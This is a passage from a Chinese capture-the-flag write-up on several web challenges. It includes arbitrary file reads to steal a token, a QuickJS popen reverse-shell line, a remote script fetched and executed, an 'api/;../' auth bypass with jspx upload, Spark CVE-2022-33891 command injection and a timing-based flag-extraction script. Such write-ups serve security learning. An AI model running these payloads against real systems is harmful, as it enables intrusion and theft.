<h4 id="任意文件读取">任意文件读取<a class="post-anchor" href="#任意文件读取"></a></h4><p>convert路由调用了fetchFile函数 获取文件内容 这个函数可以读取本地文件<br>convert读取文件后只对文件进行了简单的正则替换 所以,我们可以利用这个路由读取任意文件.<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081983860-a0b63f51-a018-4c59-bfdd-aa3858d0b3fc.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=713&amp;id=u78a0ad2b&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=891&amp;originWidth=1290&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=167244&amp;status=done&amp;style=none&amp;taskId=u8214b48c-4bfc-4e38-a919-fd90352ba82&amp;title=&amp;width=1032" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081983860-a0b63f51-a018-4c59-bfdd-aa3858d0b3fc.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=713&amp;id=u78a0ad2b&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=891&amp;originWidth=1290&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=167244&amp;status=done&amp;style=none&amp;taskId=u8214b48c-4bfc-4e38-a919-fd90352ba82&amp;title=&amp;width=1032" alt="图片.png"></a>成功读取当前目录下的配置文件  (其实这个项目还有一堆文件读取点 x)<br>鉴权token到手</p>
<h4 id=""><a class="post-anchor" href="#"></a></h4><h4 id="构造quickjs脚本">构造quickjs脚本<a class="post-anchor" href="#构造quickjs脚本"></a></h4><p>在官方文档中查找代码中引入的库所对应的函数列表<br>很快在std库中发现了一个常见的命令执行函数popen</p>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083415735-e4fc67a6-a02e-4103-9033-d63df0d3a8e7.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=613&amp;id=u9a21dd19&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=766&amp;originWidth=1792&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=124373&amp;status=done&amp;style=none&amp;taskId=u5e9c34f1-0560-4af6-afd8-e9766ea7552&amp;title=&amp;width=1433.6" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083415735-e4fc67a6-a02e-4103-9033-d63df0d3a8e7.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=613&amp;id=u9a21dd19&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=766&amp;originWidth=1792&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=124373&amp;status=done&amp;style=none&amp;taskId=u5e9c34f1-0560-4af6-afd8-e9766ea7552&amp;title=&amp;width=1433.6" alt="图片.png"></a>直接构造一个反弹shell</p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript">std.popen(<span class="hljs-string">"bash -c 'echo 5YGH6KOF6L+Z5piv5LiA5p2h5Y+N5by5c2hlbGzor63lj6UgIGlAcmNlLm1vZQ==|base64 -d|bash'"</span>, <span class="hljs-string">"r"</span>);<br></code></pre></td></tr></tbody></table></figure>
<h4 id="RCE-链">RCE 链<a class="post-anchor" href="#RCE-链"></a></h4><p>到这里可以整理出最简单的两条RCE链:<br><strong>修改配置文件-&gt;添加计划任务-&gt;计划任务执行脚本</strong><br><strong>写入文件-&gt;转换profile-&gt;执行本地脚本</strong><br>修改配置文件的路由是POST方法<br>后来发现题目使用的中间件代理只允许GET请求,还限制了传入参数.所以第一条只能放弃.</p>
<h4 id="RCE-1">RCE!<a class="post-anchor" href="#RCE-1"></a></h4><p>第一步<br>读取配置文件 获取token<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083293118-d73617bc-acf3-4fce-9f40-44203c91559e.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=713&amp;id=uf7d31fd7&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=891&amp;originWidth=1290&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=167244&amp;status=done&amp;style=none&amp;taskId=u29d3cefa-72a1-4ef5-b79b-e0510d9fa73&amp;title=&amp;width=1032" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083293118-d73617bc-acf3-4fce-9f40-44203c91559e.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=713&amp;id=uf7d31fd7&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=891&amp;originWidth=1290&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=167244&amp;status=done&amp;style=none&amp;taskId=u29d3cefa-72a1-4ef5-b79b-e0510d9fa73&amp;title=&amp;width=1032" alt="图片.png"></a>第二步<br>缓存远程文件<br>/convert?url=<a target="_blank" rel="noopener" href="http://1.1.1.1:8000/1.js">http://1.1.1.1:8000/1.js</a><br>第三步<br>计算缓存文件名 带入token 触发订阅转换 执行脚本<br>/sub?token=K5unAFg0wPO1j&amp;target=clash&amp;url=script:cache/c290fb8309721db5f8622eb278635c1a</p>
<p>GETSHELL!<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083723485-882bdb34-42ea-419b-b2ce-e23bcca457d1.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=545&amp;id=ub01e4e63&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=681&amp;originWidth=809&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=33074&amp;status=done&amp;style=none&amp;taskId=u584032ce-1daf-4760-9b54-dc45f873f93&amp;title=&amp;width=647.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083723485-882bdb34-42ea-419b-b2ce-e23bcca457d1.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=545&amp;id=ub01e4e63&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=681&amp;originWidth=809&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=33074&amp;status=done&amp;style=none&amp;taskId=u584032ce-1daf-4760-9b54-dc45f873f93&amp;title=&amp;width=647.2" alt="图片.png"></a></p>
<h4 id="小插曲">小插曲<a class="post-anchor" href="#小插曲"></a></h4><p>当时我的一个用于出网检测的vps 由于网络被动,在第一次发起请求时并没有返回数据.<br>还以为目标服务器不出网.<br>为了解决不出网的问题.<br>当时就想到了利用嵌套convert构造一个url. 在不出网的情况下缓存文件.<br>127.0.0.1:25500/convert?url=<a target="_blank" rel="noopener" href="http://127.0.0.1:25500/convert?url=data://text/plain,abcdefg123123orange">http://127.0.0.1:25500/convert?url=data://text/plain,abcdefg123123orange</a><br>结果发现了一个玄学的现象<br>自身发起的请求总是无法请求到自身的http服务<br>请求本地其他web服务正常访问<br>排查了半天后在数据包发现请求中有一个特殊的请求头<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083006117-07b9cc7d-0268-46e8-8289-1f986d781c39.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=287&amp;id=ua30d3135&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=359&amp;originWidth=1260&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=64261&amp;status=done&amp;style=none&amp;taskId=u827b6003-c588-4e9c-913e-5d9f4a1af1a&amp;title=%E6%8E%92%E6%9F%A5%E4%BA%86%E5%8D%8A%E5%A4%A9%E6%89%8D%E6%89%BE%E5%87%BA%E7%9A%84%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7&amp;width=1008" data-caption="排查了半天才找出的安全特性" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083006117-07b9cc7d-0268-46e8-8289-1f986d781c39.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=287&amp;id=ua30d3135&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=359&amp;originWidth=1260&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=true&amp;size=64261&amp;status=done&amp;style=none&amp;taskId=u827b6003-c588-4e9c-913e-5d9f4a1af1a&amp;title=%E6%8E%92%E6%9F%A5%E4%BA%86%E5%8D%8A%E5%A4%A9%E6%89%8D%E6%89%BE%E5%87%BA%E7%9A%84%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7&amp;width=1008" alt="排查了半天才找出的安全特性"></a>为了防止回环请求(自身访问自身服务)引起的dos<br>在http头打了一个标记,收到有标记的请求直接拒绝访问.<br>研究了半天发现无法绕过这个特性<br>本来要放弃的时候我又随手一测 发现又能访问我的VPS了 x)</p>
<h2 id="easyjeecg">easyjeecg<a class="post-anchor" href="#easyjeecg"></a></h2><p>一血<br>一个开源java 项目<br><a target="_blank" rel="noopener" href="https://github.com/zhangdaiscott/jeecg">https://github.com/zhangdaiscott/jeecg</a><br>题目描述写的签到题难度 (checkin)<br>实际上这道题也非常简单<br>题目修改了默认管理员密码<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084070578-9ba1b027-0db4-45da-8ef0-87ea58268729.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=586&amp;id=u1d1cb3f5&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=732&amp;originWidth=1264&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=120286&amp;status=done&amp;style=none&amp;taskId=u4ebec9a1-67a0-43f8-b182-4cfe83dff66&amp;title=&amp;width=1011.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084070578-9ba1b027-0db4-45da-8ef0-87ea58268729.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=586&amp;id=u1d1cb3f5&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=732&amp;originWidth=1264&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=120286&amp;status=done&amp;style=none&amp;taskId=u4ebec9a1-67a0-43f8-b182-4cfe83dff66&amp;title=&amp;width=1011.2" alt="图片.png"></a>首先看下鉴权过滤器部分<br>其中有一处特别显眼的路由判断<br>判断了requestpath前几位是否为 api/ 作为鉴权白名单<br>可以直接使用 api/;../ 绕过这个全局鉴权<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084290566-fd173b37-7c4e-4352-84d4-14c59a29dd55.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=602&amp;id=u51ded191&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=752&amp;originWidth=1331&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=195845&amp;status=done&amp;style=none&amp;taskId=u5e95798a-625c-4b86-bcdc-134b01d1afe&amp;title=&amp;width=1064.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084290566-fd173b37-7c4e-4352-84d4-14c59a29dd55.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=602&amp;id=u51ded191&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=752&amp;originWidth=1331&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=195845&amp;status=done&amp;style=none&amp;taskId=u5e95798a-625c-4b86-bcdc-134b01d1afe&amp;title=&amp;width=1064.8" alt="图片.png"></a><br>之后找到了一处后台上传点<br>题目禁止了访问upload目录下的jsp  jspx绕过之<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084317392-1a4b77b4-936a-43a5-b800-8bf453045e04.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=638&amp;id=u6da3b025&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=798&amp;originWidth=1519&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=298065&amp;status=done&amp;style=none&amp;taskId=u5130e906-a187-4aaa-9ea0-659cec93bc5&amp;title=&amp;width=1215.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084317392-1a4b77b4-936a-43a5-b800-8bf453045e04.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=638&amp;id=u6da3b025&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=798&amp;originWidth=1519&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=298065&amp;status=done&amp;style=none&amp;taskId=u5130e906-a187-4aaa-9ea0-659cec93bc5&amp;title=&amp;width=1215.2" alt="图片.png"></a><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084327018-51c58db3-2972-40a1-812b-785eeba9d72d.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=221&amp;id=ubf6a565d&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=276&amp;originWidth=630&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=20675&amp;status=done&amp;style=none&amp;taskId=u3e0a4db5-0ec6-4cb4-8c0c-521b45237c6&amp;title=&amp;width=504" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084327018-51c58db3-2972-40a1-812b-785eeba9d72d.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=221&amp;id=ubf6a565d&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=276&amp;originWidth=630&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=20675&amp;status=done&amp;style=none&amp;taskId=u3e0a4db5-0ec6-4cb4-8c0c-521b45237c6&amp;title=&amp;width=504" alt="图片.png"></a></p>
<h2 id="Java">Java<a class="post-anchor" href="#Java"></a></h2><p>一道简单的内网渗透题</p>
<h4 id="ssrf">ssrf<a class="post-anchor" href="#ssrf"></a></h4><p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084444340-c626962e-7428-4008-90d7-5c1225e86f27.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=525&amp;id=u4ac97193&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=656&amp;originWidth=1398&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=538422&amp;status=done&amp;style=none&amp;taskId=ud468895f-9b7c-4b66-b3e8-009960252ad&amp;title=&amp;width=1118.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084444340-c626962e-7428-4008-90d7-5c1225e86f27.png#clientId=uab9fe332-309a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=525&amp;id=u4ac97193&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=656&amp;originWidth=1398&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=538422&amp;status=done&amp;style=none&amp;taskId=ud468895f-9b7c-4b66-b3e8-009960252ad&amp;title=&amp;width=1118.4" alt="图片.png"></a>网站只有一个获取url访问的功能<br>扫描内网同网段的机器<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084581601-d2b5a2ff-5456-45ef-8195-6d5f6e1a4eb0.png#clientId=u6f66eab9-d873-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=483&amp;id=uf4bad709&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=604&amp;originWidth=1153&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=183866&amp;status=done&amp;style=none&amp;taskId=ubf0dcfff-71c4-43e8-82f8-5410728974d&amp;title=&amp;width=922.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661084581601-d2b5a2ff-5456-45ef-8195-6d5f6e1a4eb0.png#clientId=u6f66eab9-d873-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=483&amp;id=uf4bad709&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=604&amp;originWidth=1153&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=183866&amp;status=done&amp;style=none&amp;taskId=ubf0dcfff-71c4-43e8-82f8-5410728974d&amp;title=&amp;width=922.4" alt="图片.png"></a><br>发现了一个低版本spark</p>
<h4 id="spark">spark<a class="post-anchor" href="#spark"></a></h4><p>直接尝试 CVE-2022-33891<br>发现过滤了空格和`<br>多次测试发现目标机器完全不出网<br>尝试使用延时获取flag</p>
<h4 id="bash延时”注入”">bash延时”注入”<a class="post-anchor" href="#bash延时”注入”"></a></h4><p>按照之前题目的套路 ,web题目的flag都是运行/readflag 读取<br>先判断/readflag 是否存在<br>编写bash脚本</p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript">file=<span class="hljs-string">"/readflag"</span><br><span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"$file"</span> ]; then<br>  sleep <span class="hljs-number">3</span><br>fi<br></code></pre></td></tr></tbody></table></figure>
<p>构造url<br>url=<a target="_blank" rel="noopener" href="http://10.244.0.145:8080/?doAs=%7Cecho$%7BIFS%7DZmlsZT0iL3JlYWRmbGFnIgppZiBbIC1mICIkZmlsZSIgXTsgdGhlbgogIHNsZWVwIDMKZmk=%7Cbase64$%7BIFS%7D-d$%7BIFS%7D%7Cbash&amp;Vcode=FPML">http://10.244.0.145:8080/?doAs=|echo${IFS}ZmlsZT0iL3JlYWRmbGFnIgppZiBbIC1mICIkZmlsZSIgXTsgdGhlbgogIHNsZWVwIDMKZmk%3D|base64${IFS}-d${IFS}|bash&amp;Vcode=FPML</a><br>根据延迟判断根目录下存在 readflag<br>编写bash脚本判断文件内容</p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript">VAR=<span class="hljs-string">`/readflag`</span>;<br><span class="hljs-keyword">if</span> [[ <span class="hljs-string">"${VAR:0:1}"</span> = <span class="hljs-string">"a"</span> ]]; then<br>    sleep <span class="hljs-number">2</span><br><span class="hljs-keyword">else</span><br>    sleep <span class="hljs-number">0</span><br>fi<br></code></pre></td></tr></tbody></table></figure>

<p>奇怪的事情发生了 远程的机器测试无法复现 在执行第一行后就会立马退出<br>尝试把执行后的结果写到临时文件 读取临时文件<br>/readflag &gt;/tmp/dfsdef<br>再次尝试读取第一字节 脚本测试通过<br>之后随手写了个简单的python2脚本用于自动化判断</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib<br><br>small = [<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">97</span>,<span class="hljs-number">123</span>)]<br>big = [<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65</span>,<span class="hljs-number">91</span>)]<br>num =[<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>)]<br>lista=small+big+num+[<span class="hljs-string">'{'</span>,<span class="hljs-string">'}'</span>,<span class="hljs-string">' '</span>,<span class="hljs-string">"\n"</span>,<span class="hljs-string">'-'</span>,<span class="hljs-string">'_'</span>]<br>data1=<span class="hljs-string">"""VAR=`cat /tmp/dfsdef`;</span><br><span class="hljs-string">if [[ "${{VAR:{}:1}}" = "{}" ]]; then</span><br><span class="hljs-string">    sleep 2</span><br><span class="hljs-string">else</span><br><span class="hljs-string">    sleep 0</span><br><span class="hljs-string">fi"""</span><br><br><span class="hljs-built_in">print</span>(lista)<br><br>b=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> lista:<br>        datab=data1.<span class="hljs-built_in">format</span>(b,a)<br>        <span class="hljs-keyword">try</span>:<br>            requests.post(<span class="hljs-string">"http://1.13.254.132:8080/file"</span>,data=<span class="hljs-string">"url=http://10.244.0.145:8080/?doAs=|echo${IFS}"</span>+urllib.quote(base64.b64encode(datab.encode()))+<span class="hljs-string">"|base64${IFS}-d${IFS}|bash&amp;Vcode=FPML"</span>, cookies={<span class="hljs-string">'JSESSIONID'</span>:<span class="hljs-string">'1F64EAF97095DA0736F5EE5B0F7CF20A'</span>},headers={<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/x-www-form-urlencoded'</span>}, timeout=<span class="hljs-number">1</span>,verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(a)<br>            <span class="hljs-keyword">break</span><br>    b=b+<span class="hljs-number">1</span><br><br><br><br></code></pre></td></tr></tbody></table></figure>

<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085387349-a9ff9945-95f2-4683-98d6-6ab78d0bbe59.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=246&amp;id=u7d7ec2d3&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=308&amp;originWidth=1566&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=214298&amp;status=done&amp;style=none&amp;taskId=u4e0b747b-b0d2-43bc-9266-ac7ca21e35a&amp;title=&amp;width=1252.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085387349-a9ff9945-95f2-4683-98d6-6ab78d0bbe59.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=246&amp;id=u7d7ec2d3&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=308&amp;originWidth=1566&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=214298&amp;status=done&amp;style=none&amp;taskId=u4e0b747b-b0d2-43bc-9266-ac7ca21e35a&amp;title=&amp;width=1252.8" alt="图片.png"></a>readflag 返回了一个奇怪的内容<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085422042-84bb9157-27e0-4e84-b07a-ad78511cc63b.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=69&amp;id=ua8b646b0&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=86&amp;originWidth=369&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=3046&amp;status=done&amp;style=none&amp;taskId=u75f0c58c-1366-46d1-a5d8-7295e545ee7&amp;title=&amp;width=295.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085422042-84bb9157-27e0-4e84-b07a-ad78511cc63b.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=69&amp;id=ua8b646b0&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=86&amp;originWidth=369&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=3046&amp;status=done&amp;style=none&amp;taskId=u75f0c58c-1366-46d1-a5d8-7295e545ee7&amp;title=&amp;width=295.2" alt="图片.png"></a><br>看起来是某种交互shell 提示需要输入队伍token   因为没有输入返回了错误</p>
<h4 id="交互shell">交互shell<a class="post-anchor" href="#交互shell"></a></h4><p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085503860-36e95e41-6b49-4cdc-b58f-6b5fb5bf08d5.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=574&amp;id=u704e5c48&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=717&amp;originWidth=1642&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=68063&amp;status=done&amp;style=none&amp;taskId=ud1b838d8-0da1-4829-a227-7d91b01d3a2&amp;title=&amp;width=1313.6" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085503860-36e95e41-6b49-4cdc-b58f-6b5fb5bf08d5.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=574&amp;id=u704e5c48&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=717&amp;originWidth=1642&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=68063&amp;status=done&amp;style=none&amp;taskId=ud1b838d8-0da1-4829-a227-7d91b01d3a2&amp;title=&amp;width=1313.6" alt="图片.png"></a><br>如果遇到这种普通的交互shell 有一个非常简单的解决方法<br>直接echo 后面加上换行符  使用管道重定向到目标的标准输入<br>重新读取返回<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085605583-a77b8681-1938-4b91-ac78-1477c7b2db24.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=734&amp;id=u21a93f97&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=918&amp;originWidth=1241&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=46317&amp;status=done&amp;style=none&amp;taskId=ufeabd1a2-5569-4708-a678-6cd7eb53f93&amp;title=&amp;width=992.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661085605583-a77b8681-1938-4b91-ac78-1477c7b2db24.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=734&amp;id=u21a93f97&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=918&amp;originWidth=1241&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=46317&amp;status=done&amp;style=none&amp;taskId=ufeabd1a2-5569-4708-a678-6cd7eb53f93&amp;title=&amp;width=992.8" alt="图片.png"></a><br>成功getflag</p>
<h2 id="6166lover">6166lover<a class="post-anchor" href="#6166lover"></a></h2><p>这道题非常可惜 卡在了阿里云ak sts利用的部分<br>题目使用了rust +rocket  </p>
<h4 id="信息泄露">信息泄露<a class="post-anchor" href="#信息泄露"></a></h4><p>根目录中的Cargo.toml可以被下载</p>
